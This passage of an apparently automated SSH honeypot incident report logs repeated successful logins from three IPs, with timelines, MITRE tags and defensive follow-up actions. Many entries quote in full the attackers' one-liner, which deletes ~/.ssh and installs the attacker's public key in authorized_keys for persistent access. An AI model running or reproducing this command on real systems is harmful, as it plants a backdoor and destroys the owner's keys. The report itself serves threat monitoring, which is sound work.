| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:54:29` | `cowrie.session.connect` |
| `2026-04-24 13:54:29` | `cowrie.client.version` |
| `2026-04-24 13:54:29` | `cowrie.client.kex` |
| `2026-04-24 13:54:30` | `cowrie.login.success` |
| `2026-04-24 13:54:30` | `cowrie.session.params` |
| `2026-04-24 13:54:30` | `cowrie.command.input` |
| `2026-04-24 13:54:30` | `cowrie.command.failed` |
| `2026-04-24 13:54:30` | `cowrie.log.closed` |
| `2026-04-24 13:54:30` | `cowrie.session.params` |
| `2026-04-24 13:54:30` | `cowrie.command.input` |
| `2026-04-24 13:54:30` | `cowrie.session.file_download` |
| `2026-04-24 13:54:30` | `cowrie.log.closed` |
| `2026-04-24 13:54:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]177` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7935a19048f0

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]177` |
| **First Seen** | 2026-04-24 13:54 |
| **Last Seen** | 2026-04-24 13:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:54:32` | `cowrie.session.connect` |
| `2026-04-24 13:54:32` | `cowrie.client.version` |
| `2026-04-24 13:54:32` | `cowrie.client.kex` |
| `2026-04-24 13:54:33` | `cowrie.login.success` |
| `2026-04-24 13:54:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]177` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cc30c385873

| Field | Detail |
|---|---|
| **Source IP** | `103.146.202[.]174` |
| **First Seen** | 2026-04-24 13:55 |
| **Last Seen** | 2026-04-24 13:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:55:25` | `cowrie.session.connect` |
| `2026-04-24 13:55:25` | `cowrie.client.version` |
| `2026-04-24 13:55:25` | `cowrie.client.kex` |
| `2026-04-24 13:55:26` | `cowrie.login.success` |
| `2026-04-24 13:55:26` | `cowrie.session.params` |
| `2026-04-24 13:55:26` | `cowrie.command.input` |
| `2026-04-24 13:55:26` | `cowrie.command.failed` |
| `2026-04-24 13:55:27` | `cowrie.log.closed` |
| `2026-04-24 13:55:27` | `cowrie.session.params` |
| `2026-04-24 13:55:27` | `cowrie.command.input` |
| `2026-04-24 13:55:27` | `cowrie.session.file_download` |
| `2026-04-24 13:55:27` | `cowrie.log.closed` |
| `2026-04-24 13:55:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.202[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.146.202[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca2bbe79f561

| Field | Detail |
|---|---|
| **Source IP** | `103.146.202[.]174` |
| **First Seen** | 2026-04-24 13:55 |
| **Last Seen** | 2026-04-24 13:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:55:30` | `cowrie.session.connect` |
| `2026-04-24 13:55:30` | `cowrie.client.version` |
| `2026-04-24 13:55:30` | `cowrie.client.kex` |
| `2026-04-24 13:55:30` | `cowrie.login.success` |
| `2026-04-24 13:55:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.202[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.146.202[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb872451e5ee

| Field | Detail |
|---|---|
| **Source IP** | `209.38.69[.]153` |
| **First Seen** | 2026-04-24 13:56 |
| **Last Seen** | 2026-04-24 13:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:56:10` | `cowrie.session.connect` |
| `2026-04-24 13:56:10` | `cowrie.client.version` |
| `2026-04-24 13:56:10` | `cowrie.client.kex` |
| `2026-04-24 13:56:11` | `cowrie.login.success` |
| `2026-04-24 13:56:12` | `cowrie.session.params` |
| `2026-04-24 13:56:12` | `cowrie.command.input` |
| `2026-04-24 13:56:12` | `cowrie.command.failed` |
| `2026-04-24 13:56:12` | `cowrie.log.closed` |
| `2026-04-24 13:56:13` | `cowrie.session.params` |
| `2026-04-24 13:56:13` | `cowrie.command.input` |
| `2026-04-24 13:56:13` | `cowrie.session.file_download` |
| `2026-04-24 13:56:13` | `cowrie.log.closed` |
| `2026-04-24 13:56:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.69[.]153` to AbuseIPDB if not already reported
- [ ] Block `209.38.69[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-989fce7c3a28

| Field | Detail |
|---|---|
| **Source IP** | `209.38.69[.]153` |
| **First Seen** | 2026-04-24 13:56 |
| **Last Seen** | 2026-04-24 13:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:56:16` | `cowrie.session.connect` |
| `2026-04-24 13:56:16` | `cowrie.client.version` |
| `2026-04-24 13:56:16` | `cowrie.client.kex` |
| `2026-04-24 13:56:17` | `cowrie.login.success` |
| `2026-04-24 13:56:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.69[.]153` to AbuseIPDB if not already reported
- [ ] Block `209.38.69[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f48229d1d253

| Field | Detail |
|---|---|
| **Source IP** | `103.146.202[.]174` |
| **First Seen** | 2026-04-24 13:57 |
| **Last Seen** | 2026-04-24 13:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:57:31` | `cowrie.session.connect` |
| `2026-04-24 13:57:31` | `cowrie.client.version` |
| `2026-04-24 13:57:31` | `cowrie.client.kex` |
| `2026-04-24 13:57:32` | `cowrie.login.success` |
| `2026-04-24 13:57:32` | `cowrie.session.params` |
| `2026-04-24 13:57:32` | `cowrie.command.input` |
| `2026-04-24 13:57:32` | `cowrie.command.failed` |
| `2026-04-24 13:57:32` | `cowrie.log.closed` |
| `2026-04-24 13:57:33` | `cowrie.session.params` |
| `2026-04-24 13:57:33` | `cowrie.command.input` |
| `2026-04-24 13:57:33` | `cowrie.session.file_download` |
| `2026-04-24 13:57:33` | `cowrie.log.closed` |
| `2026-04-24 13:57:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.202[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.146.202[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d946f05f7bf2

| Field | Detail |
|---|---|
| **Source IP** | `103.146.202[.]174` |
| **First Seen** | 2026-04-24 13:57 |
| **Last Seen** | 2026-04-24 13:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:57:35` | `cowrie.session.connect` |
| `2026-04-24 13:57:35` | `cowrie.client.version` |
| `2026-04-24 13:57:35` | `cowrie.client.kex` |
| `2026-04-24 13:57:36` | `cowrie.login.success` |
| `2026-04-24 13:57:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.202[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.146.202[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e582ffd04125

| Field | Detail |
|---|---|
| **Source IP** | `209.38.69[.]153` |
| **First Seen** | 2026-04-24 13:58 |
| **Last Seen** | 2026-04-24 13:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:58:05` | `cowrie.session.connect` |
| `2026-04-24 13:58:05` | `cowrie.client.version` |
| `2026-04-24 13:58:05` | `cowrie.client.kex` |
| `2026-04-24 13:58:06` | `cowrie.login.success` |
| `2026-04-24 13:58:07` | `cowrie.session.params` |
| `2026-04-24 13:58:07` | `cowrie.command.input` |
| `2026-04-24 13:58:07` | `cowrie.command.failed` |
| `2026-04-24 13:58:07` | `cowrie.log.closed` |
| `2026-04-24 13:58:08` | `cowrie.session.params` |
| `2026-04-24 13:58:08` | `cowrie.command.input` |
| `2026-04-24 13:58:08` | `cowrie.session.file_download` |
| `2026-04-24 13:58:08` | `cowrie.log.closed` |
| `2026-04-24 13:58:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.69[.]153` to AbuseIPDB if not already reported
- [ ] Block `209.38.69[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b491ca6f1935

| Field | Detail |
|---|---|
| **Source IP** | `209.38.69[.]153` |
| **First Seen** | 2026-04-24 13:58 |
| **Last Seen** | 2026-04-24 13:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:58:11` | `cowrie.session.connect` |
| `2026-04-24 13:58:11` | `cowrie.client.version` |
| `2026-04-24 13:58:12` | `cowrie.client.kex` |
| `2026-04-24 13:58:13` | `cowrie.login.success` |
| `2026-04-24 13:58:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.69[.]153` to AbuseIPDB if not already reported
- [ ] Block `209.38.69[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-288cae0e39cb

| Field | Detail |
|---|---|
| **Source IP** | `103.146.202[.]174` |
| **First Seen** | 2026-04-24 13:58 |
| **Last Seen** | 2026-04-24 13:58 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:58:39` | `cowrie.session.connect` |
| `2026-04-24 13:58:39` | `cowrie.client.version` |
| `2026-04-24 13:58:39` | `cowrie.client.kex` |
| `2026-04-24 13:58:40` | `cowrie.login.success` |
| `2026-04-24 13:58:40` | `cowrie.session.params` |
| `2026-04-24 13:58:40` | `cowrie.command.input` |
| `2026-04-24 13:58:40` | `cowrie.command.failed` |
| `2026-04-24 13:58:40` | `cowrie.log.closed` |
| `2026-04-24 13:58:41` | `cowrie.session.params` |
| `2026-04-24 13:58:41` | `cowrie.command.input` |
| `2026-04-24 13:58:41` | `cowrie.session.file_download` |
| `2026-04-24 13:58:41` | `cowrie.log.closed` |
| `2026-04-24 13:58:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.202[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.146.202[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35dfaf83ab17

| Field | Detail |
|---|---|
| **Source IP** | `103.146.202[.]174` |
| **First Seen** | 2026-04-24 13:58 |
| **Last Seen** | 2026-04-24 13:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:58:43` | `cowrie.session.connect` |
| `2026-04-24 13:58:43` | `cowrie.client.version` |
| `2026-04-24 13:58:43` | `cowrie.client.kex` |
| `2026-04-24 13:58:44` | `cowrie.login.success` |
| `2026-04-24 13:58:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.202[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.146.202[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b5d38d181d7

| Field | Detail |
|---|---|
| **Source IP** | `209.38.69[.]153` |
| **First Seen** | 2026-04-24 13:59 |
| **Last Seen** | 2026-04-24 13:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:59:03` | `cowrie.session.connect` |
| `2026-04-24 13:59:03` | `cowrie.client.version` |
| `2026-04-24 13:59:03` | `cowrie.client.kex` |
| `2026-04-24 13:59:04` | `cowrie.login.success` |
| `2026-04-24 13:59:05` | `cowrie.session.params` |
| `2026-04-24 13:59:05` | `cowrie.command.input` |
| `2026-04-24 13:59:05` | `cowrie.command.failed` |
| `2026-04-24 13:59:05` | `cowrie.log.closed` |
| `2026-04-24 13:59:05` | `cowrie.session.params` |
| `2026-04-24 13:59:05` | `cowrie.command.input` |
| `2026-04-24 13:59:06` | `cowrie.session.file_download` |
| `2026-04-24 13:59:06` | `cowrie.log.closed` |
| `2026-04-24 13:59:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.69[.]153` to AbuseIPDB if not already reported
- [ ] Block `209.38.69[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9182f4acd03

| Field | Detail |
|---|---|
| **Source IP** | `209.38.69[.]153` |
| **First Seen** | 2026-04-24 13:59 |
| **Last Seen** | 2026-04-24 13:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:59:09` | `cowrie.session.connect` |
| `2026-04-24 13:59:09` | `cowrie.client.version` |
| `2026-04-24 13:59:09` | `cowrie.client.kex` |
| `2026-04-24 13:59:10` | `cowrie.login.success` |
| `2026-04-24 13:59:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.69[.]153` to AbuseIPDB if not already reported
- [ ] Block `209.38.69[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1749355a10d0

| Field | Detail |
|---|---|
| **Source IP** | `209.38.69[.]153` |
| **First Seen** | 2026-04-24 13:59 |
| **Last Seen** | 2026-04-24 14:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:59:56` | `cowrie.session.connect` |
| `2026-04-24 13:59:56` | `cowrie.client.version` |
| `2026-04-24 13:59:57` | `cowrie.client.kex` |
| `2026-04-24 13:59:58` | `cowrie.login.success` |
| `2026-04-24 13:59:58` | `cowrie.session.params` |
| `2026-04-24 13:59:58` | `cowrie.command.input` |
| `2026-04-24 13:59:58` | `cowrie.command.failed` |
| `2026-04-24 13:59:59` | `cowrie.log.closed` |
| `2026-04-24 13:59:59` | `cowrie.session.params` |
| `2026-04-24 13:59:59` | `cowrie.command.input` |
| `2026-04-24 14:00:00` | `cowrie.session.file_download` |
| `2026-04-24 14:00:00` | `cowrie.log.closed` |
| `2026-04-24 14:00:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.69[.]153` to AbuseIPDB if not already reported
- [ ] Block `209.38.69[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c7af9d17067

| Field | Detail |
|---|---|
| **Source IP** | `209.38.69[.]153` |
| **First Seen** | 2026-04-24 14:00 |
| **Last Seen** | 2026-04-24 14:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:00:03` | `cowrie.session.connect` |
| `2026-04-24 14:00:03` | `cowrie.client.version` |
| `2026-04-24 14:00:03` | `cowrie.client.kex` |
| `2026-04-24 14:00:04` | `cowrie.login.success` |
| `2026-04-24 14:00:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.69[.]153` to AbuseIPDB if not already reported
- [ ] Block `209.38.69[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad91ef4387f0

| Field | Detail |
|---|---|
| **Source IP** | `209.38.69[.]153` |
| **First Seen** | 2026-04-24 14:01 |
| **Last Seen** | 2026-04-24 14:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:01:42` | `cowrie.session.connect` |
| `2026-04-24 14:01:42` | `cowrie.client.version` |
| `2026-04-24 14:01:43` | `cowrie.client.kex` |
| `2026-04-24 14:01:44` | `cowrie.login.success` |
| `2026-04-24 14:01:44` | `cowrie.session.params` |
| `2026-04-24 14:01:44` | `cowrie.command.input` |
